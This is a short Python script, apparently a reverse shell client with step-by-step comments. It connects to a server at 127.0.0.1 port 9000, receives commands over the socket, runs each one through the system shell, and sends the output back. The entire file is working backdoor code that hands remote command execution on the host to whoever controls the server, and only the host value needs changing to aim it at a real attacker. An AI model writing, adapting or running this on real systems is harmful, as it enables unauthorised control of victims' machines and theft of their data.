import socket  # For creating network connections
import os  # For interacting with the file system
import subprocess  # For running shell commands

def main():
    # Define the server's IP address and port number
    host = "127.0.0.1"
    port = 9000

    # Create a socket and establish a connection to the server
    with socket.socket() as s:
        s.connect((host, port))

        while True:
            # Wait for a command from the server
            data = s.recv(1024)  # Receive up to 1024 bytes of data
            if not data:  # If no data is received, exit the loop
                break

            # Decode the received data to a string and remove leading/trailing spaces
            command = data.decode("utf-8").strip()

            if command.startswith("cd"):
                # If the command is a 'cd', attempt to change the current working directory
                try:
                    os.chdir(command[3:])  # Extract and change to the specified directory
                except OSError as e:
                    # Print an error message if the directory change fails
                    print(f"Error changing directory: {e}")
            else:
                # For all other commands, execute them using the subprocess module
                try:
                    result = subprocess.run(
                        command, shell=True, capture_output=True, text=True
                    )  # Run the command
                    output = result.stdout + result.stderr  # Combine standard output and error
                    s.sendall(output.encode("utf-8"))  # Send the output back to the server
                    print(output)  # Print the output locally for debugging
                except subprocess.CalledProcessError as e:
                    # Print an error message if the command execution fails
                    print(f"Error executing command: {e}")

# Check if the script is being run directly and start the main function
if __name__ == "__main__":
    main()
